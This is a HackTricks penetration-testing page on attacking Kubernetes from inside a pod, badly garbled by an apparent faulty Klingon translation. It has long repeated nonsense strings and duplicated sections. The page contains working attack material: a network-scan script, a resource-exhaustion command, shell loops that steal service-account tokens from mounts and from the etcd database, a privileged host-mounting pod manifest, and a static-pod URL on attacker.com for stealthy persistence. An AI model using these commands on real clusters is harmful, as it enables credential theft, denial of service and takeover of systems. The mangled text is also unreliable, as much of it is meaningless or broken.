# Attacking Kubernetes from inside a Pod

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Pod Breakout**

**If you are lucky enough you may be able to escape from it to the node:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Escaping from the pod

In order to try to escape from the pos you might need to **escalate privileges** first, some techniques to do it:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

You can check this **docker breakouts to try to escape** from a pod you have compromised:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Abusing Kubernetes Privileges

As explained in the section about **kubernetes enumeration**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Usually the pods are run with a **service account token** inside of them. This service account may have some **privileges attached to it** that you could **abuse** to **move** to other pods or even to **escape** to the nodes configured inside the cluster. Check how in:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Abusing Cloud Privileges

If the pod is run inside a **cloud environment** you might be able to l**eak a token from the metadata endpoint** and escalate privileges using it.

## Search vulnerable network services

As you are inside the Kubernetes environment, if you cannot escalate privileges abusing the current pods privileges and you cannot escape from the container, you should **search potential vulnerable services.**

### Services

**For this purpose, you can try to get all the services of the kubernetes environment:**
```
kubectl get svc --all-namespaces
```
**ghItlh** Kubernetes, **Kubernetes** **flat networking schema** **vaj** **ghItlh** **pod/service** **cluster** **talk** **vaj** **namespace**. **namespaces** **cluster** **network security restrictions** **vaj** **default**. **namespace** **vaj** **talk** **vaj** **namespace**.

### **Scanning**

**Bash script** **(Kubernetes workshop** [**ghItlh**](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) **install** **scan** **IP ranges** **kubernetes cluster**:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Qapla'! **attack Kubernetes specific services** to **compromise other pods/all the environment**:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Sniffing

In case the **compromised pod is running some sensitive service** where other pods need to authenticate you might be able to obtain the credentials send from the other pods **sniffing local communications**.

## Network Spoofing

By default techniques like **ARP spoofing** (and thanks to that **DNS Spoofing**) work in kubernetes network. Then, inside a pod, if you have the **NET\_RAW capability** (which is there by default), you will be able to send custom crafted network packets and perform **MitM attacks via ARP Spoofing to all the pods running in the same node.**\
Moreover, if the **malicious pod** is running in the **same node as the DNS Server**, you will be able to perform a **DNS Spoofing attack to all the pods in cluster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

There is no specification of resources in the Kubernetes manifests and **not applied limit** ranges for the containers. As an attacker, we can **consume all the resources where the pod/deployment running** and starve other resources and cause a DoS for the environment.

This can be done with a tool such as [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
**DaH jImej** `stress-ng` **chel** **'ej** **'oH**.

```bash
$ stress-ng --cpu 1 --timeout 10s
```

**'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej** **'oH** **DaH** **'ej** **'oH** **'ej
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node Post-Exploitation

If you managed to **escape from the container** there are some interesting things you will find in the node:

* The **Container Runtime** process (Docker)
* More **pods/containers** running in the node you can abuse like this one (more tokens)
* The whole **filesystem** and **OS** in general
* The **Kube-Proxy** service listening
* The **Kubelet** service listening. Check config files:
* Directory: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Other **kubernetes common files**:
* `$HOME/.kube/config` - **User Config**
* `/etc/kubernetes/kubelet.conf`- **Regular Config**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Bootstrap Config**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd Configuration**
* `/etc/kubernetes/pki` - **Kubernetes Key**

### Find node kubeconfig

If you cannot find the kubeconfig file in one of the previously commented paths, **check the argument `--kubeconfig` of the kubelet process**:

## Node Post-Exploitation

If you managed to **escape from the container** there are some interesting things you will find in the node:

* The **Container Runtime** process (Docker)
* More **pods/containers** running in the node you can abuse like this one (more tokens)
* The whole **filesystem** and **OS** in general
* The **Kube-Proxy** service listening
* The **Kubelet** service listening. Check config files:
* Directory: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Other **kubernetes common files**:
* `$HOME/.kube/config` - **User Config**
* `/etc/kubernetes/kubelet.conf`- **Regular Config**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Bootstrap Config**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd Configuration**
* `/etc/kubernetes/pki` - **Kubernetes Key**

### Find node kubeconfig

If you cannot find the kubeconfig file in one of the previously commented paths, **check the argument `--kubeconfig` of the kubelet process**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### qawHaq jImej

{:.box-warning}
**Warning:** qawHaq jImej involves unauthorized access and is illegal. This section is for educational purposes only.

To steal secrets from within a Kubernetes pod, you can use various techniques:

#### 1. Environment Variables

If the secrets are stored as environment variables within the pod, you can access them by running commands within the pod's container. Use the `env` command to list all environment variables and look for any sensitive information.

#### 2. Mounted Volumes

If the secrets are mounted as volumes within the pod, you can access them by exploring the mounted directories. Use the `ls` command to list the contents of the mounted directories and look for any sensitive files.

#### 3. API Access

If the pod has access to the Kubernetes API, you can use the API to retrieve secrets. Use the appropriate API endpoint and authentication method to access the secrets.

#### 4. Exploiting Vulnerabilities

If the pod or the underlying container runtime has any vulnerabilities, you can exploit them to gain unauthorized access and steal secrets. Research and exploit any known vulnerabilities in the pod or container runtime.

Remember to always obtain proper authorization before attempting any hacking techniques.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
The script [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) will automatically **get the tokens of other pods and check if they have the permission** you are looking for (instead of you looking 1 by 1):

**Translation (Klingon):**

[**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) **script** **ghItlh** **tokens** **pIj** **pods** **check** **permission** **you** **looking** **(1 by 1)** **automatically** **will**.
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privileged DaemonSets

**DaemonSet** vItlhutlh **pod** vaj **run** **cluster** **nodes**. **DaemonSet** configured **privileged service account**, **ALL nodes** **token** **privileged service account** **abuse**.

**exploit** **previous section** **same** **one**, **luck** **depend** **now**.

### Pivot to Cloud

**cluster** **managed** **cloud service**, **Node** **different access metadata** **endpoint** **Pod**. **metadata endpoint** **access** **node** (or **pod hostNetwork True**):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Steal etcd

**nodeName** [**specify**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) **Node** **run** **container**, **shell** **inside control-plane node** **etcd database** **get**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
#### etcdDaq pagh etlh

vaj vay' pod spec 'ej 'ej `nodeName` selector vay' control-plane node Daq run pod vay', 'ej vaj 'etcd' database, vay' 'ej vay' secrets vay' vItlhutlh.

vaj 'etcd' Daq run vay' control-plane node vay' vItlhutlh 'etcd' vay' grab secrets vay' vaj vay' way. vaj 'etcd' client utility 'etcdctl' 'ej vay' control-plane node's credentials vay' etcd vay' connect vay' vaj vay' pod vay' spin up vay' vay' solution vay' vaj 'etcd' vay' example manifest vay' [ghap](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) mauilion.

**vaj 'etcd' Daq run vay' control-plane node vay' vItlhutlh 'ej vay' database vay' vItlhutlh (vay' 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej '
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Attacking Kubernetes from Inside a Pod

## Introduction

In this section, we will explore various techniques to attack a Kubernetes cluster from inside a pod. By compromising a pod, an attacker can gain unauthorized access to the cluster and potentially escalate privileges.

## 1. Exploiting Misconfigurations

### 1.1. Insecure Pod Permissions

Kubernetes allows users to define pod security policies (PSPs) to restrict the permissions of pods. However, misconfigurations in PSPs can lead to insecure pod permissions, allowing an attacker to perform unauthorized actions.

To exploit this, an attacker can create a malicious pod with elevated privileges by bypassing the PSPs. This can be achieved by modifying the pod's security context or using a privileged container.

### 1.2. Insecure Pod Networking

Misconfigurations in pod networking can also provide an entry point for attackers. For example, if a pod is exposed to the public internet without proper network policies, an attacker can directly access the pod and potentially compromise the entire cluster.

To exploit this, an attacker can scan for exposed pods using tools like Nmap or Masscan. Once an exposed pod is identified, the attacker can attempt to exploit vulnerabilities or launch further attacks.

## 2. Container Breakouts

### 2.1. Escaping Container Isolation

Containers within a pod are isolated from each other by default. However, misconfigurations or vulnerabilities in container runtimes can allow an attacker to escape this isolation and gain access to other containers or the host system.

To exploit this, an attacker can leverage container escape techniques such as namespace manipulation, kernel vulnerabilities, or container runtime misconfigurations. Once escaped, the attacker can move laterally within the cluster or perform privilege escalation.

### 2.2. Privilege Escalation

If an attacker gains access to a container with limited privileges, they can attempt to escalate their privileges to gain higher levels of access within the cluster.

To exploit this, an attacker can search for misconfigured RBAC roles or service accounts that grant excessive privileges. They can also attempt to exploit vulnerabilities in the container runtime or the underlying host system to gain root access.

## Conclusion

Attacking a Kubernetes cluster from inside a pod requires a deep understanding of the underlying infrastructure and various attack techniques. By exploiting misconfigurations and vulnerabilities, an attacker can gain unauthorized access to the cluster and potentially cause significant damage. It is crucial for administrators to implement proper security measures and regularly audit their cluster for potential vulnerabilities.
```bash
data-dir=/var/lib/etcd
```
**View the data in etcd database:**

**etcd database-vaH cha'logh:**

```bash
kubectl exec -it <pod_name> -n <namespace> -- sh
ETCDCTL_API=3 etcdctl --endpoints=https://<etcd_endpoint>:2379 --cacert=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --cert=/var/run/secrets/kubernetes.io/serviceaccount/tls.crt --key=/var/run/secrets/kubernetes.io/serviceaccount/tls.key get / --prefix --keys-only
```

**etcd database-vaH cha'logh:**

```bash
kubectl exec -it <pod_name> -n <namespace> -- sh
ETCDCTL_API=3 etcdctl --endpoints=https://<etcd_endpoint>:2379 --cacert=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --cert=/var/run/secrets/kubernetes.io/serviceaccount/tls.crt --key=/var/run/secrets/kubernetes.io/serviceaccount/tls.key get / --prefix --keys-only
```
```bash
strings /var/lib/etcd/member/snap/db | less
```
**QapHa' tokens vItlhutlh database 'ej service account name chaw'be'**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**tlhIngan Hol:**
**Qaghmey, 'ach chel greps vItlhutlhlaHbe'lu'chugh, kube-system namespaceDaq default token vItlhutlhlaHbe'lu'chugh**

**English:**
**Same command, but some greps to only return the default token in the kube-system namespace**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Attacking Kubernetes from Inside a Pod

## Introduction

In this section, we will explore various techniques to attack a Kubernetes cluster from inside a pod. By compromising a pod, an attacker can gain unauthorized access to the cluster and potentially escalate privileges.

## 1. Exploiting Misconfigurations

### 1.1. Insecure Pod Permissions

Kubernetes allows users to define pod security policies (PSPs) to restrict the permissions of pods. However, misconfigurations in PSPs can lead to insecure pod permissions, allowing an attacker to perform unauthorized actions.

To exploit this, an attacker can create a malicious pod with elevated privileges by bypassing the PSPs. This can be achieved by modifying the pod's security context or using a privileged container.

### 1.2. Insecure Pod Networking

Misconfigurations in pod networking can also provide an entry point for attackers. For example, if a pod is exposed to the public internet without proper network policies, an attacker can directly access the pod and potentially compromise the entire cluster.

To exploit this, an attacker can scan for exposed pods using tools like Nmap or Masscan. Once an exposed pod is identified, the attacker can attempt to exploit vulnerabilities or launch further attacks.

## 2. Container Breakouts

### 2.1. Escaping Container Isolation

Containers within a pod are isolated from each other by default. However, misconfigurations or vulnerabilities in container runtimes can allow an attacker to escape this isolation and gain access to other containers or the host system.

To exploit this, an attacker can leverage container escape techniques such as namespace manipulation, kernel vulnerabilities, or container runtime misconfigurations. Once escaped, the attacker can move laterally within the cluster or perform privilege escalation.

### 2.2. Privilege Escalation

If an attacker gains access to a container with limited privileges, they can attempt to escalate their privileges to gain higher levels of access within the cluster.

To exploit this, an attacker can search for misconfigured RBAC roles or service accounts that grant excessive privileges. They can also attempt to exploit vulnerabilities in the container runtime or the underlying host system to gain root access.

## Conclusion

Attacking a Kubernetes cluster from inside a pod requires a deep understanding of the underlying infrastructure and various attack techniques. By exploiting misconfigurations and vulnerabilities, an attacker can gain unauthorized access to the cluster and potentially cause significant damage. It is crucial for administrators to implement proper security measures and regularly audit their cluster for potential vulnerabilities.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Static/Mirrored Pods Persistence

_Static Pods_ are managed directly by the kubelet daemon on a specific node, without the API server observing them. Unlike Pods that are managed by the control plane (for example, a Deployment); instead, the **kubelet watches each static Pod** (and restarts it if it fails).

Therefore, static Pods are always **bound to one Kubelet** on a specific node.

The **kubelet automatically tries to create a mirror Pod on the Kubernetes API server** for each static Pod. This means that the Pods running on a node are visible on the API server, but cannot be controlled from there. The Pod names will be suffixed with the node hostname with a leading hyphen.

{% hint style="danger" %}
The **`spec` of a static Pod cannot refer to other API objects** (e.g., ServiceAccount, ConfigMap, Secret, etc. So **you cannot abuse this behaviour to launch a pod with an arbitrary serviceAccount** in the current node to compromise the cluster. But you could use this to run pods in different namespaces (in case thats useful for some reason).
{% endhint %}

If you are inside the node host you can make it create a **static pod inside itself**. This is pretty useful because it might allow you to **create a pod in a different namespace** like **kube-system**.

In order to create a static pod, the [**docs are a great help**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). You basically need 2 things:

* Configure the param **`--pod-manifest-path=/etc/kubernetes/manifests`** in the **kubelet service**, or in the **kubelet config** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) and restart the service
* Create the definition on the **pod definition** in **`/etc/kubernetes/manifests`**

**Another more stealth way would be to:**

* Modify the param **`staticPodURL`** from **kubelet** config file and set something like `staticPodURL: http://attacker.com:8765/pod.yaml`. This will make the kubelet process create a **static pod** getting the **configuration from the indicated URL**.

**Example** of **pod** configuration to create a privilege pod in **kube-system** taken from [**here**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Delete pods + unschedulable nodes

If an attacker has **compromised a node** and he can **delete pods** from other nodes and **make other nodes not able to execute pods**, the pods will be rerun in the compromised node and he will be able to **steal the tokens** run in them.\
For [**more info follow this links**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Automatic Tools

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
